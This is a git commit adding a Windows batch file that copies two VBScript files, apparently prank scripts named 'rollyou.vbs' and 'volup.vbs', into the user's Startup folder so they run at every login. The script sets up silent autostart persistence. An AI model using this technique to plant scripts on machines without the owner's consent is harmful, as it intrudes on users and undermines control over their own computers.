d0be091267c996a458eb1d47d460654247b61d69
ExpiredBeatle49 <60576955+ExpiredBeatle49@users.noreply.github.com>
2023-01-03 22:06:50 -0500

    Add files via upload

---
+++ run.bat
@@ -0,0 +1,6 @@
+cd D:\
+del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\rollyou.vbs"
+del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\volup.vbs"
+copy rollyou.vbs "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
+copy volup.vbs "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
+exit
